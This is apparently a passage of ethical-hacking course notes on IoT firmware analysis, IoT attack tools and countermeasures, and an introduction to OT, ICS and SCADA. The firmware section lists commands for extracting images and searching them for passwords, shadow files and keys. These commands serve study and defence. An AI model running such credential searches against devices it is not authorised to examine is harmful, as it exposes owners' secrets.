			- Once an attacker gains access to a device, they use various techniques to maintain persistence and further exploit the system. To remain undetected, attackers may clear logs, update firmware, and deploy malicious programs such as backdoors and trojans. Additionally, they use specialized tools like Firmware Mod Kit, IoTVAS, Firmware Analysis Toolkit, and Firmwalker to exploit firmware vulnerabilities.
			- Maintaining Access by Exploiting Firmware (code.google.com):
				- The Firmware Mod Kit is a toolset designed for deconstructing and reconstructing firmware images of embedded devices. While primarily targeting Linux-based routers, it is compatible with most firmware using common formats and file systems such as TRX/uImage and SquashFS/CramFS. This kit includes a collection of tools, utilities, and shell scripts that can be used individually or combined for automated firmware operations, such as extraction and rebuilding.
				- How Attackers Use Firmware Mod Kit:
					- Extract firmware images into their component parts.
					- Modify the firmware’s file system or web UI (Webif).
					- Rebuild the firmware with the desired changes.
					- Flash the modified firmware onto the device, potentially causing it to malfunction (brick).
				- Core Scripts for Firmware Operations:
					- Primary Scripts:
						- extract-firmware.sh -> Extracts firmware components.
						- build-firmware.sh -> Rebuilds firmware images.
					- Secondary Scripts:
						- ddwrt-gui-extract.sh -> Extracts Web GUI files from DD-WRT firmware.
						- ddwrt-gui-rebuild.sh -> Restores modified Web GUI files in DD-WRT firmware.
			- Firmware Analysis and Reverse Engineering:
				- Firmware serves as the central component in controlling various IoT devices. Attackers analyze the firmware of target IoT devices to uncover underlying vulnerabilities and security loopholes. Through firmware analysis, they can identify passwords, API tokens, endpoints, vulnerable services, backdoor accounts, configuration files, private keys, stored data, and more.
				- Steps Used by Attackers for Firmware Analysis and Reverse Engineering (owasp.org):
					- Obtain Firmware:
						- After gaining access to the target IoT device, extract the firmware from the device.
					- Analyze Firmware:
						- Run the following commands to analyze the extracted firmware:
							- Identify the file type: file xyz.bin
							- Verify the MD5 signature:
								cat xyz.md5
								md5sum xyz.bin
							- Extract readable text from the binary file:
								strings -n 10 xyz.bin > strings.out
								less strings.out
							- Perform a hexadecimal dump to identify the firmware build type:
								hexdump -C -n 512 xyz.bin > hexdump.out
								cat hexdump.out
					- Extract the Filesystem:
						- Use binwalk to analyze and extract the firmware image: binwalk xyz.bin
						- This helps identify the type of filesystem in use.
						- Extract the filesystem using dd: dd if=xyz.bin bs=1 skip=922460 count=2522318 of=xyz.squashfs
					- Mount the Filesystem:
						- Create a mount directory: mkdir rootfs
						- Mount the extracted filesystem: sudo mount -t ext2 {filename} rootfs
					- Analyze Filesystem Content:
						- Once the filesystem is mounted, examine key files and directories:
						- Check for sensitive files: ls etc/passwd etc/shadow etc/ssl
						- Search for credentials, configuration files, and other sensitive information:
							grep -rnw '/path/to/somewhere/' -e "password|admin|root"
							find . -name '*.conf' -o -name '*.pem' -o -name '*.crt' -o -name '*.cfg' -o -name '*.sh' -o -name '*.bin'
						- Use Firmwalker to automate the search for sensitive information in the extracted filesystem
					- Emulate Firmware for Dynamic Testing:
						- To perform dynamic testing of the device’s web interface, use emulation tools such as QEMU or the Firmware Analysis Toolkit.
						- Identify the CPU architecture
							file xyz.bin
							readelf -h xyz.bin
						- User-mode emulation with QEMU:
							qemu-mipsel -L <prefix> <binary>
							qemu-arm -L <prefix> <binary>
							qemu-<arch> -L <prefix> <binary>
						- Cross-architecture chroot emulation:
							- Transfer the qemu-<arch>-static binary to the firmware root filesystem (/usr/bin/), then execute: chroot ~/<filename> /bin/
		- IoT Hacking Tools:
			- Attackers use IoT hacking tools to gather information about devices connected to a network, including their open ports, services, attack surface, and vulnerabilities. These tools enable further exploitation of the devices and the organization's network. This section covers various IoT hacking tools.
			- IoT Hacking Tools:
				- Below are some of the IoT hacking tools used by attackers to exploit target IoT devices and networks. These tools facilitate attacks such as DDoS, jamming, and BlueBorne.
				- CatSniffer (github.com): CatSniffer is used by attackers to passively monitor IoT traffic, gathering information on connected devices, communication protocols, and data exchanges. This helps identify potential targets and vulnerabilities within an IoT network. Security professionals and network administrators can also use CatSniffer to monitor and secure IoT environments by analyzing transmitted data.
				- KillerBee (github.com)
				- JTAGULATOR (www.grandideastudio.com)
				- wiz_exploit (github.com)
				- PENIOT (github.com)
				- RouterSploit (github.com)
	- IoT Attack Countermeasures:
		- This section discusses various IoT security measures, device management strategies, and security tools that help prevent, detect, and mitigate attacks on IoT devices and their networks. By implementing these countermeasures, organizations can establish robust security mechanisms to safeguard the confidential information transmitted between IoT devices and corporate networks.
		- Defend Against IoT Hacking:
			- Account Security:
				- Disable “guest” and “demo” accounts if enabled.
				- Use account lockout policies and CAPTCHA to prevent brute-force attacks.
				- Enforce strong passwords (8–10 characters with letters, numbers, and symbols).
			- Authentication & Encryption:
				- Implement strong authentication mechanisms, including two-way authentication (SHA with HMAC & ECDSA).
				- Use end-to-end encryption and public key infrastructure (PKI).
				- Secure encryption keys and credentials in a Secure Access Module (SAM), TPM, HSM, or other trusted key stores.
			- Network & Access Control:
				- Isolate IoT devices on protected networks behind firewalls.
				- Use enterprise-grade security tools (firewalls, IDS/IPS, NAC, UBA, IAM).
				- Allow only trusted IP addresses for external device access.
				- Disable unnecessary services and ports (e.g., Telnet, UPnP).
				- Implement VPN architecture for secure communication.
			- Device & Firmware Security:
				- Regularly update firmware and patch vulnerabilities.
				- Use a secure boot option with cryptographic code signing to prevent unauthorized firmware execution.
				- Work with vendors that follow security best practices and standards.
			- Traffic & Threat Monitoring:
				- Monitor network traffic for anomalies, especially on critical ports (e.g., 48101).
				- Deploy honeypots and deception technologies to detect intrusions.
				- Use a cloud-based anti-DDoS solution and CDNs to mitigate attacks.
			- Privacy & Data Protection:
				- Ensure data authentication and confidentiality using symmetric key encryption.
				- Prevent disclosure of IP addresses by disabling WebRTC in browsers.
				- Use trusted execution environments (TEE) or security elements (SE) for sensitive data.
				- Employ active masking and shielding techniques to mitigate side-channel attacks.
				- Validate code before execution to reduce TOCTOU vulnerabilities.
			- IoT Device & Application Management:
				- Configure IoT devices securely, disabling unused features.
				- Use centralized device management for monitoring and updates.
				- Change default router settings, including name and password.
				- Avoid public Wi-Fi for IoT management.
				- Read privacy policies before installing applications.
			- Advanced Security Strategies:
				- Adopt a zero-trust security model for continuous authentication.
				- Run IoT applications in isolated containers or sandboxes.
				- Consider leveraging blockchain for tamper-proof audit trails and secure transactions.
		- Prevent SDR-Based Attacks:
			- IoT devices are vulnerable to attacks from various directions, especially when attackers have the necessary tools and knowledge. To prevent such attacks before devices are compromised, proactive measures must be taken.
			- The following methods can help protect IoT devices from SDR-based attacks:
				- Securing the Signal: One of the most effective ways to prevent software-defined radio (SDR) attacks is to secure signals using standard encryption methods.
				- Avoiding Command Repetition with a Rolling Code Technique: Repeated use of the same commands can expose devices to replay attacks. Implementing a rolling code scheme ensures that previously used commands cannot be reused, reducing the risk of brute-force attacks.
				- Adopting Synchronization and Preamble Nibbles: Commands should be segmented using preamble and synchronization nibbles. Without these, attackers can exploit vulnerabilities using techniques like the de Bruijn sequence, which reduces the number of bits required to brute-force multiple command sequences.
				- Implementing Anti-Jamming Techniques: Deploy anti-jamming measures to detect and mitigate interference or unauthorized transmissions that may be carried out using SDRs.
				- Utilizing Frequency Hopping: Use frequency-hopping spread spectrum (FHSS) technology to rapidly switch between frequencies within a given radio band. This makes it more difficult for attackers to track and intercept signals.
				- Ensuring Secure Key Management: Adopt strong key management practices using hardware security modules (HSMs) for secure storage and cryptographic operations in SDR-based communication systems.
				- Securing Over-the-Air (OTA) Updates: Ensure OTA updates are protected with cryptographic signatures and secure transmission channels to maintain the integrity and authenticity of firmware updates and configuration changes.
		- General Guidelines for IoT Device Manufacturers:
			- Manufacturers of IoT devices should ensure the implementation of the following basic security measures:
				- Use SSL/TLS for secure communication.
				- Perform mutual authentication on SSL certificates and regularly check the certificate revocation list.
				- Encourage the use of strong passwords and enforce password complexity requirements.
				- Ensure credentials are not hardcoded; instead, store them securely in trusted storage.
				- Implement a secure and simple update process using a chain of trust.
				- Enable account lockout mechanisms after a defined number of incorrect login attempts to prevent brute-force attacks.
				- Harden devices wherever possible to minimize attack surfaces.
				- Regularly audit the device for unused tools, and use whitelisting to allow only trusted applications to run.
				- Utilize a secure boot chain to verify the integrity of all software executed on the device.
				- Conduct thorough security assessments on new product features before release.
				- Avoid unsafe functions like gets(); instead, use safe alternatives such as fgets() to mitigate buffer overflow risks in C or C++ IoT programs.
				- Incorporate security throughout the IoT software development lifecycle (SDLC).
				- Ensure the security of users’ personal data by providing transparency about data collection, sharing, and transfer practices.
				- Provide clear guidelines for consumers on device security and configuration settings.
				- Implement external hardware tamper detection to enhance the physical security of IoT devices.
				- Integrate network security features such as firewalls, intrusion detection systems (IDS), and network segmentation to mitigate network-based threats.
				- Maintain transparency about the device's security features and known risks, and provide a clear contact method for security researchers to report vulnerabilities.
				- Use industry-standard secure communication protocols such as MQTT, CoAP, or HTTPS for transmitting data between IoT devices and backend servers.
				- Integrate hardware-based security features, such as Trusted Platform Modules (TPM) or secure elements, to safeguard cryptographic keys, enable secure boot, and provide tamper-resistant storage for sensitive data.
		- OWASP Top 10 IoT Vulnerabilities and Solutions (owasp.org):
			- The rapid development of IoT technology has often overlooked the security of devices, leading to increased risks such as cyberattacks, data breaches, and privacy violations. To mitigate these risks, developers and security professionals must thoroughly test IoT devices for vulnerabilities before integrating them into an infrastructure.
			- Below are the OWASP Top 10 IoT security vulnerabilities and their corresponding solutions:
				- Weak, Guessable, or Hardcoded Passwords:
					- Implement Automated Password Management (APM).
					- Use strong, complex passwords.
					- Avoid hardcoded passwords.
				- Insecure Network Services:
					- Close unnecessary open network ports.
					- Disable Universal Plug and Play (UPnP).
					- Encrypt data before TLS communication.
				- Insecure Ecosystem Interfaces:
					- Enable account lockout mechanisms.
					- Conduct periodic security assessments of interfaces.
					- Perform sanity checks and output filtering.
					- Use strong passwords and enable two-factor authentication (2FA).
				- Lack of a Secure Update Mechanism:
					- Verify the source and integrity of updates.
					- Encrypt communication between endpoints.
					- Notify users about security updates.
				- Use of Insecure or Outdated Components:
					- Regularly monitor and remove unmaintained components.
					- Eliminate unused dependencies and unnecessary features.
					- Avoid third-party software from compromised supply chains.
				- Insufficient Privacy Protection:
					- Minimize data collection.
					- Anonymize collected data.
					- Allow users to control what data is collected.
				- Insecure Data Transfer and Storage:
					- Encrypt all communication between endpoints.
					- Maintain updated SSL/TLS implementations.
					- Avoid proprietary encryption solutions.
				- Lack of Proper Device Management:
					- Blacklist malicious devices from untrusted sources.
					- Validate all asset attributes.
					- Securely decommission retired devices.
				- Insecure Default Settings:
					- Change default usernames and passwords immediately.
					- Customize privacy and security settings.
					- Disable remote access when not needed.
				- Lack of Physical Hardening:
					- Set unique passwords for BIOS/firmware.
					- Configure device boot order to prevent unauthorized booting.
					- Minimize external access points such as USB ports.
		- IoT Framework Security Considerations:
			- To design secure and protected IoT devices, security issues must be carefully considered. One of the most important aspects is the development of a secure IoT framework for building these devices. Ideally, a framework should be designed to provide default security, ensuring that developers do not have to address security concerns later.
			- The security evaluation criteria for an IoT framework are divided into four key components. Each component has specific security-related concerns, which are discussed in the evaluation criteria below:
				- Edge:
					- The edge refers to the primary physical device in the IoT ecosystem that interacts with its surroundings. It consists of various components such as sensors, actuators, operating systems, hardware, and networking capabilities. Since edge devices are highly heterogeneous and can be deployed in various environments, an ideal framework should offer cross-platform compatibility to ensure functionality in diverse conditions.
					- Additional security considerations for edge devices include:
						- Proper encryption for communication and storage.
						- Elimination of default credentials.
						- Strong password enforcement.
						- Use of up-to-date components and security patches.
				- Gateway:
					- The gateway acts as the intermediary between edge devices and the Internet, connecting smart devices to cloud components. It functions as a communication aggregator, facilitating secure connections between a trusted local network and an untrusted public network while providing an added layer of security for connected devices.
					- An ideal framework for the gateway should incorporate:
						- Strong encryption techniques for secure communication.
						- Robust authentication mechanisms for edge components.
						- Multi-directional authentication between the edge and the cloud.
						- Automatic updates to mitigate vulnerabilities.
				- Cloud Platform:
					- In an IoT ecosystem, the cloud component serves as the central hub for data aggregation and management. Due to its critical role, access to the cloud must be strictly controlled. The cloud platform is often at higher risk because it aggregates a vast amount of data and includes a command and control (C2) component, responsible for issuing updates and managing system configurations.
					- A secure cloud framework should include:
						- Encrypted communication channels.
						- Strong authentication credentials.
						- A secure web interface.
						- Encrypted data storage.
						- Automatic updates to address security vulnerabilities.
				- Mobile Interface:
					- The mobile interface plays a vital role in IoT ecosystems, especially in remote data access and management. Mobile applications enable users to interact with edge devices from remote locations. While some applications provide limited access to specific edge devices, others allow full control over IoT components. Due to their connectivity, mobile interfaces are susceptible to cyber threats and require strong security measures.
					- A secure mobile framework should include:
						- Robust user authentication mechanisms.
						- An account lockout mechanism after multiple failed login attempts.
						- Secure local storage for sensitive data.
						- Encrypted communication channels.
						- Protection for data transmitted over networks.
			- By implementing a security-first approach within the IoT framework, organizations can enhance device protection, mitigate potential risks, and ensure the safety of IoT ecosystems.
		- IoT Hardware Security Best Practices:
			- Securing IoT hardware is crucial in preventing persistent attacks at the foundational level. However, there are significant differences in the manufacturing, development, and deployment of IoT hardware across different manufacturers.
			- Organizations can adopt the following countermeasures to secure their IoT hardware against prevalent attacks in the modern digital landscape:
				- Limit Entry Points: Minimize potential attack vectors by restricting unnecessary entry points, such as USB ports, to prevent unauthorized access. Lock or disable unused ports to reduce the risk of intrusion.
				- Employ a Hardware Tamper Protection Mechanism: Implement tamper detection mechanisms to identify physical damage or unauthorized access at the board level. This includes detecting device lifting, alterations, lid removal, and chip-level intrusions. Additionally, installing a GPS unit can help track misplaced devices.
				- Monitor Secure Booting: Ensure the integrity of the boot process to prevent attackers from tampering with the hardware or executing boot-level attacks that grant privileged access. Depending on the asset value, implement secure storage solutions such as Trusted Platform Module (TPM) chips.
				- Implement Security Patches: Regularly update firmware in a secure manner to mitigate vulnerabilities. Ensure that both pre- and post-patch update processes are protected against security threats.
				- Maintain a Secure Interface Management System: Properly integrate IoT hardware with secure interfaces during development to prevent API and library vulnerabilities. APIs expose device activity and functionality, making them a potential attack vector if not secured.
				- Restrict Physical Access to Hardware: Protect IoT hardware from physical tampering, especially when deployed in public or harsh environments. Close open ports with dummy covers to prevent unauthorized intrusion and physical damage.
				- Secure Authentication Keys: Safeguard authentication keys associated with unique device IDs linked to cloud services. Implement robust security measures to protect these keys, as a breach could allow attackers to take control of devices.
				- Maintain an Effective Event Logging Mechanism: Conduct regular security audits and enable continuous event logging to enhance incident detection and response. Keep comprehensive logs of all security events to help prevent recurring attacks.
				- Deploy Anti-Malware Protection: Install reputable third-party antivirus and anti-malware software to detect and prevent security breaches at hardware entry points.
				- Enable Default Entry-Level Logging: Periodically monitor entry logs by leveraging built-in logging features provided by most operating systems (OSes). Continuous log monitoring helps detect and mitigate security breaches at the entry level.
				- Protect Device Access Credentials: Secure access credentials by employing multiple security mechanisms, such as encryption, magic-number authentication, and two-factor authentication.
				- Isolate Devices from Unprotected Power Sources: Protect devices from electrical attacks, such as Rowhammer attacks, which exploit sudden power surges to damage RAM chips and core components.
				- Implement a Root-of-Trust Mechanism: Establish a trusted entry-point system for root-level access, ensuring that only authorized users can gain control.
				- Secure Legacy Units with Modern Gateway Security: Enhance security in legacy IoT networks by deploying modern gateways that introduce security features without requiring hardware upgrades.
				- Secure Wireless Communication: Strengthen wireless interfaces (e.g., Wi-Fi, Bluetooth, Zigbee) by implementing encryption, authentication, and access control measures to prevent unauthorized access.
				- Secure Debug Interfaces: Disable or protect debugging interfaces (e.g., JTAG, UART) to prevent unauthorized access to device internals and sensitive information.
				- Establish a Hardware-Based Root of Trust: Leverage trusted execution environments (TEEs) or secure enclaves to safeguard critical security functions and cryptographic operations from tampering.
				- Secure Sensor Data Handling: Ensure secure processing of sensor data through validation, integrity protection, and privacy-preserving techniques.
				- Implement Hardware-Based Intrusion Detection: Integrate hardware-level intrusion detection mechanisms, such as sensors or monitoring circuits, to detect physical tampering, side-channel attacks, and unauthorized access.
			- The following are countermeasures for encrypting communication data and securing TPMs in IoT hardware units:
				- Utilize third-party authentication software, such as BitLocker Drive Encryption, to authenticate data imported from external storage outside the TPM perimeter.
				- Employ software tools such as Nuvoton for IoT hardware units, using communication interfaces like I²C and SPI in TPM devices.
				- Bind data for transfer using a TPM bind key, a special encryption key based on the RSA encryption standard.
				- Implement the sealing and unsealing concept of hardware authentication during major computational updates, such as firmware updates and security patches, for IoT hardware units.
				- Use an HMAC-key-based secure communication mechanism between TPM-based IoT devices and end users.
				- Implement symmetric-key encryption for low-data-transmission applications where data are stored outside the TPM perimeter, ensuring the authenticity and integrity of imported data.
				- Verify sender authentication before decrypting received data using the HMAC verification procedure facilitated by TPM devices, employing block-mode encryption algorithms such as Cipher Block Chaining (CBC) and Cipher Feedback (CFB).
				- Use RSA-based encryption with digital signatures to ensure data integrity.
				- Store keys in non-volatile random-access memory (NVRAM) using TPMs, enabling read/write functionality during incidents such as data loss due to environmental stress or malicious attacks.
				- Utilize the canonical mode of data transfer to optimize data transmission by eliminating unnecessary bytes in prolonged data-stream communications with TPM-based IoT devices.
				- Leverage root-of-trust (RoT) models, such as Root of Trust for Measurement (RTM) and Root of Trust for Verification (RTV), provided by TPM devices for secure booting and data transmission in IoT hardware units.
				- Enable Perfect Forward Secrecy (PFS) to ensure that each communication session uses a unique session key not derived from a long-term key.
				- Utilize certificate-based authentication mechanisms to verify the identities of IoT devices and backend servers before establishing a secure connection.
				- Use remote attestation mechanisms provided by TPMs to verify the integrity of IoT devices and assess their security posture against remote servers or services.
				- Implement authenticated encryption with associated data (AEAD) algorithms, such as AES-GCM and AES-CCM, which provide both confidentiality and integrity protection for communication data.
				- Use hardware-based random number generators (RNGs) to generate cryptographic keys and initialization vectors (IVs) for encryption.
				- Leverage cryptographic hardware acceleration features available in modern processors or dedicated cryptographic coprocessors to offload encryption and decryption operations from the CPU.
				- Implement key rotation policies to periodically update encryption keys used for communication between IoT devices and backend servers.
		- Secure Development Practices for IoT Applications:
			- The following are some best practices for securing IoT applications:
				- Ensure Secure Boot: Ensure that devices only execute authenticated and validated code at boot time to prevent unauthorized firmware updates or tampering.
				- Secure API Endpoints: Protect APIs with authentication, access controls, and data validation to prevent attacks such as SQL injection, cross-site scripting (XSS), and cross-site request forgery (CSRF).
				- Implement Threat Modeling: Identify potential security threats and risks specific to IoT applications and ecosystems, considering factors such as data privacy, device authentication, and communication protocols.
				- Follow Secure Coding Practices: Adhere to secure coding standards to prevent common vulnerabilities such as buffer overflows, injection attacks, and XSS in IoT application code.
				- Conduct Security Testing: Perform comprehensive security testing, including penetration testing, vulnerability scanning, and code reviews, throughout the development lifecycle to identify and remediate security weaknesses.
				- Secure Firmware and Software Updates: Implement secure over-the-air (OTA) update mechanisms to ensure the safe delivery of patches and firmware updates, preventing unauthorized tampering and exploitation.
				- Ensure Device Identity Management: Use unique identifiers and digital certificates for IoT devices to enable secure authentication and establish trust within the IoT ecosystem.
				- Implement Hardware Security: Utilize hardware-based security features such as Trusted Platform Modules (TPM), secure elements, or Hardware Security Modules (HSM) to securely store cryptographic keys, perform secure computations, and protect sensitive data.
				- Enforce Code Signing: Digitally sign firmware, software updates, and application code to verify authenticity and integrity before installation on IoT devices, reducing the risk of unauthorized modifications or malware injection.
				- Implement Runtime Protection: Employ runtime protection mechanisms such as code execution monitoring, stack overflow protection, and memory safety checks to detect and prevent software exploitation at runtime.
				- Ensure Secure Cloud Integration: Secure cloud integration by implementing proper authentication, access controls, and encryption to protect sensitive data stored or processed in the cloud.
				- Utilize Secure Communication Protocols: Use secure communication protocols such as MQTT with TLS/SSL for device-to-cloud communication, ensuring confidentiality, integrity, and authentication during data exchanges.
		- IoT Device Management Solutions:
			- IoT device management solutions are used by security professionals, IT administrators, and IoT specialists for onboarding, organizing, monitoring, and managing IoT devices.
			- Below are some notable IoT device management solutions:
				- Azure IoT Central (azure.microsoft.com): Azure IoT Central is a cloud-based, extensible software-as-a-service (SaaS) platform designed to simplify IoT solution deployment. It enables seamless connection, monitoring, and management of IoT assets at scale. By streamlining the initial setup process, Azure IoT Central helps reduce management overhead, operational costs, and complexities associated with IoT projects.
				- Oracle Fusion Cloud Internet of Things (IoT) (www.oracle.com)
				- Golioth (golioth.io)
				- AWS IoT Device Management (aws.amazon.com)
				- IBM Watson IoT Platform (www.ibm.com)
				- openBalena (www.balena.io)
		- IoT Security Tools:
			- The IoT ecosystem comprises a vast range of connected devices and is a rapidly evolving, complex technology. To mitigate risks and ensure robust security, organizations must implement effective IoT security solutions. The use of IoT security tools helps organizations significantly reduce vulnerabilities, protecting devices and networks from various cyber threats.
			- SeaCat.io (teskalabs.com):
				- SeaCat.io is a security-first SaaS technology designed to operate IoT products in a reliable, scalable, and secure manner. It protects end users, businesses, and data. Security professionals use SeaCat.io to:
					- Manage connected products from a centralized platform.
					- Access remote devices using various tools.
					- Monitor and automate updates to fix bugs.
					- Protect users with authorized cryptography and ensure regulatory compliance.
					- Detect and prevent malware infections.
					- Safeguard devices from hacker control and botnet attacks.
				- Armis Centrix™ (www.armis.com):
					- Armis Centrix™ enables security professionals to view, protect, manage, and optimize all IoT assets, systems, and processes. It addresses vulnerabilities in IoT devices by implementing tailored security protocols that ensure compliance with industry regulations and standards.
					- Key features of Armis Centrix™ include:
						- Identifying outdated operating systems and ensuring timely updates.
						- Detecting signature-based attacks and indicators of compromise (IOCs) in advance.
						- Collecting and analyzing forensic threat data before, during, and after incidents.
						- Empowering security teams with data-driven insights to prioritize incident responses.
				- FortiNAC (www.fortinet.com)
				- Microsoft Defender for IoT (www.microsoft.com)
				- Symantec Critical System Protection (www.broadcom.com)
				- Cisco Industrial Threat Defense (www.cisco.com)
				- AWS IoT Device Defender (aws.amazon.com)
				- Forescout (www.forescout.com)
				- NSFOCUS Anti-DDoS System (nsfocusglobal.com)
				- Azure Sphere (www.microsoft.com)
				- Overwatch (overwatchsec.com)
				- Barbara (www.barbara.tech)
				- Sternum (sternumiot.com)
				- Asimily (asimily.com)
				- ByteSweep (gitlab.com)
				- Entrust IoT Security (www.entrust.com)
				- IOT ASSET DISCOVERY (securolytics.io)
- OT Hacking:
	- OT Concepts and Attacks:
		- Operational Technology (OT) plays a major role in today’s modern society, driving a collection of devices that function together as an integrated or homogeneous system. For example, in telecommunications, OT is used to transfer information from the electrical grid through wheeling power. The same telecommunications infrastructure is also used for financial transactions between electricity producers and consumers.
		- OT consists of a combination of hardware and software designed to monitor, operate, and control industrial process assets. Before learning how to hack OT, it is essential to understand its fundamental concepts. This section explores key OT concepts.
		- With the evolving security threats and changing security posture of organizations using OT, it is crucial for organizations to prioritize OT security and adopt appropriate strategies to address security challenges arising from OT/IT convergence. This section also examines various OT threats and attacks, including hacking industrial networks, HMI attacks, side-channel attacks, hacking PLCs, and compromising industrial machines via RF remote controllers.
		- What is OT:
			- Operational Technology (OT) refers to a combination of software and hardware designed to monitor, control, and detect changes in industrial operations through direct interaction with physical devices. These devices include switches, pumps, lights, sensors, surveillance cameras, elevators, robots, valves, and heating and cooling systems.
			- OT encompasses any system that analyzes and processes operational data, including technical components, electronics, telecommunications, and computer systems. It is widely used in industries such as manufacturing, mining, healthcare, building management, transportation, oil and gas, defense, and utilities to ensure the safety and efficiency of physical devices and their operations.
			- OT systems include Industrial Control Systems (ICS), which consist of Supervisory Control and Data Acquisition (SCADA) systems, Remote Terminal Units (RTUs), Programmable Logic Controllers (PLCs), Distributed Control Systems (DCS), and various other specialized network systems that facilitate industrial monitoring and control.
			- Unlike Information Technology (IT), OT employs different approaches in hardware design and communication protocols. Many OT systems rely on legacy software and hardware, making them more vulnerable to cyberattacks due to the challenges in developing security patches and updates.
		- Essential Terminology:
			- Below are some of the most important and widely used terms related to OT systems:
			- Assets:
				- In OT, different components are generally referred to as assets. Most OT systems, such as ICSs, comprise physical assets, including sensors, actuators, servers, workstations, network devices, and PLCs. ICS systems also include logical assets that represent the operation and containment of physical assets, such as graphical representations of process flows, program logic, databases, firmware, and firewall rules.
			- Zones and Conduits:
				- Zones and conduits are network segregation techniques used to isolate networks and assets, ensuring strong access control mechanisms are imposed and maintained.
			- Industrial Network and Business Network:
				- OT typically consists of a collection of automated control systems networked to achieve a business objective. A network comprising these systems is known as an industrial network. In contrast, an enterprise or business network consists of interconnected systems that provide an information infrastructure for the business. Businesses often need to establish communication between industrial and business networks.
			- Industrial Protocols:
				- Most OT systems employ either proprietary protocols (e.g., S7, CDA, SRTP) or non-proprietary protocols (e.g., Modbus, OPC, DNP3, CIP). These protocols are commonly used for serial communication but can also support communication over standard Ethernet using Internet Protocol (IP) in combination with transport layer protocols like TCP or UDP. Since these protocols operate at the application layer, they are often referred to as application protocols.
			- Network Perimeter / Electronic Security Perimeter:
				- The network perimeter is the outermost boundary of a network zone, representing a closed group of assets. It serves as the separation point between the internal and external environments of a zone. Cybersecurity controls are generally implemented at this perimeter. The Electronic Security Perimeter (ESP) refers to the boundary between secure and insecure zones.
			- Critical Infrastructure:
				- Critical infrastructure comprises physical or logical systems and assets whose failure or destruction could severely impact security, safety, the economy, or public health.
		- Introduction to ICS:
			- An Industrial Control System (ICS) is a critical component of industrial processes and infrastructure. A typical ICS serves as an information system that controls and supports various industrial operations, including production, manufacturing, product handling, and distribution.
			- ICS refers to a collection of different control systems and their associated equipment, including devices, networks, and controls used to operate and automate industrial processes. It comprises several types of control systems, such as Supervisory Control and Data Acquisition (SCADA) systems, Distributed Control Systems (DCSs), Basic Process Control Systems (BPCSs), Safety Instrumented Systems (SISs), Human-Machine Interfaces (HMIs), Programmable Logic Controllers (PLCs), Remote Terminal Units (RTUs), and Intelligent Electronic Devices (IEDs).
			- This technology includes various components, such as sensors, controllers, and actuators (mechanical, electrical, hydraulic, pneumatic, etc.), which work together to achieve industrial objectives.
			- In an ICS, the process is responsible for generating the output, while control refers to the set of instructions that guide the system toward the desired outcome. Control mechanisms can be fully automated or may involve human intervention within the process loop. ICS systems operate in three modes:
				- Open Loop: The system's output is based on preconfigured settings.
				- Closed Loop: The system's output influences the input to achieve the desired objective.
				- Manual Loop: The system is entirely controlled by human operators.
			- The controller within an ICS is primarily responsible for ensuring compliance with desired specifications. ICS systems typically include multiple control loops, HMIs, and remote maintenance and diagnostics tools. These tools rely on various networking protocols to facilitate remote monitoring and troubleshooting.
			- ICS systems are widely used in industries such as electricity generation and distribution, water supply and wastewater treatment, oil and natural gas supply, chemical and pharmaceutical production, pulp and paper manufacturing, and food and beverage production. In some cases, ICSs are physically distributed across multiple locations, with interdependent processes. In such scenarios, communication protocols play a crucial role in enabling seamless interaction between distributed ICS systems.
		- Components of ICS:
			- An Industrial Control System (ICS) is a broad category of command and control networks and systems used to monitor and manage industrial processes. Each type of ICS operates differently based on the complexity and functionality of the control actions required.
			- ICSs can be classified into the following commonly used control systems:
			- Distributed Control System (DCS):
				- A DCS is designed to control production systems within the same geographical location. These systems are primarily used for large, complex, and distributed industrial processes, such as chemical manufacturing, nuclear plants, oil refineries, water and sewage treatment facilities, power generation plants, and automobile and pharmaceutical manufacturing.
				- A DCS is typically a highly engineered, large-scale control system tailored to industry-specific tasks. It includes a centralized supervisory control unit that manages multiple local controllers, thousands of input/output (I/O) points, and various field devices involved in the production process.
				- To achieve process control, a DCS employs feedback and feedforward loops based on predefined set points. It operates using a centralized supervisory control loop, such as SCADA or MTU, which connects with localized controllers like RTUs or PLCs to coordinate production tasks.
				- A high level of redundancy is built into every layer of a DCS—from controller I/O to the network level. This redundancy ensures system continuity, allowing other processes to function smoothly in the event of a single processor failure.
				- The primary advantages of using a DCS in industrial settings are its adaptability and flexibility in managing distributed field devices and their operating stations. Additionally, DCSs are scalable, meaning they can be implemented as either a large integrated system during initial installation or as modular components that can be expanded as needed.
				- DCSs continue to evolve with advancements in technology, integrating features such as wireless communication, remote transmission, data logging and historian functions, and embedded web servers to enhance performance and efficiency.
			- Supervisory Control and Data Acquisition (SCADA):
				- SCADA is a centralized supervisory control system used for monitoring and managing industrial facilities and infrastructure. Many organizations implement SCADA systems to automate complex industrial processes, track real-time trends, and detect and correct issues efficiently.
				- SCADA systems are typically distributed over a wide geographical area. As a result, various industries rely on SCADA for applications such as oil and gas transportation, wastewater treatment and management, pipeline operations, telecommunications, power grids, building automation, and public transportation systems.
				- A SCADA system provides supervisory control and real-time data acquisition from dispersed industrial assets. It consists of hardware and software components that collect and transmit data, enabling both local and remote management of industrial processes. The collected data is stored in long-term storage devices, such as a data historian, allowing operators to analyze trends and configure setpoints. These setpoints help the system respond efficiently to anomalies, either by automatically executing commands or by alerting an operator.
				- SCADA integrates data acquisition, data transmission, and HMI (Human-Machine Interface) software to enable centralized control and monitoring of multiple process inputs and outputs. It collects data from field devices and transmits it to a central computer system, where it is displayed in graphical or textual formats. This allows operators to monitor and control the entire SCADA system in real time from a central location.
				- SCADA Architecture:
					- A SCADA system consists of:
						- Control Server (SCADA-MTU): Manages and processes information from field devices.
						- Communication Devices: Includes network cables, radio devices, telephone lines, and other communication infrastructure.
						- Field Sites: Distributed geographically, these sites include Programmable Logic Controllers (PLCs) and Remote Terminal Units (RTUs) to monitor and control industrial equipment.
				- The RTU collects data from field devices, which is then processed by the control server. Field devices are controlled and monitored by either the RTU or PLCs. The SCADA software is programmed to specify what data should be monitored, when it should be monitored, acceptable parameter ranges, and the required response when values exceed set thresholds.
				- An Intelligent Electronic Device (IED) may collect data and transmit it directly to the control server, or an RTU may instruct the IED to gather data and send it to the control server. IEDs include a communication interface for monitoring and controlling sensors and equipment. These devices can either be controlled directly by the control server or operate independently using local programming.
				- SCADA systems are designed with redundancy to ensure fault tolerance. However, this redundancy alone may not be sufficient to protect SCADA systems from malicious cyberattacks, making cybersecurity measures a critical aspect of SCADA system implementation.
			- Programmable Logic Controller (PLC):
